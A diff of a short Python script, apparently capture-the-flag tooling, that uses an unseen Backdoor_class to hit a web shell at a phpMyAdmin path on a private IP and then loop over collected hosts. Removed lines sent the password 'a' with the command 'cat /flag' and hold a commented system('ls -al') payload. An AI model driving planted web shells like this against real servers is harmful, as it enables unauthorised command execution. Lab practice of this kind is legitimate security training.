@@ -1,17 +1,14 @@
 import Backdoor_class
 a = Backdoor_class.Backdoor()
-a.testUrl("http://192.168.10.128/phpMyAdmin/js/config/two.php?pass=admin",
-          password="a", cmd="cat /flag")
-# "system('ls -al');"
+a.setUrl("http://192.168.10.128/phpMyAdmin/js/config/two.php?pass=admin")
 a.analyzeUrl()
 a.getFileAddress()
 a.readAll_IP()
-a.printAll()
-a.printALL_IP()
 a.spliceUrl()
-a.printALL_Url()
+a.printALL()
+
 for url in a.all_Url:
-    a.testUrl(url, password="a", cmd="")
+    a.testUrl(url)
 
 # def gat_IP_Address(self):
 #     self.readFileAddress()
